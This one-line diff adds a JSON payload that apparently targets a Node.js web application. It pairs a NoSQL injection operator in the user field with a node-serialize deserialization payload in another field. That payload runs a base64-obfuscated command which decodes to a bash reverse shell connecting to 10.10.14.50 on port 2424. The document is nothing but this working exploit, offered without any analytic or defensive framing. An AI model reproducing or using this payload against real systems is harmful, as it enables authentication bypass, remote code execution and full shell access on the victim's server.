@@ -1,0 +1,1 @@
+{"user":{"$ne":null},"sign":"4b7029c2a4ed7527255315fc356bf082","cok":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"echo -n L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjUwLzI0MjQgMD4mMSAK | base64 -d | bash\", function(error, stdout, stderr) { console.log(stdout) });}()"}
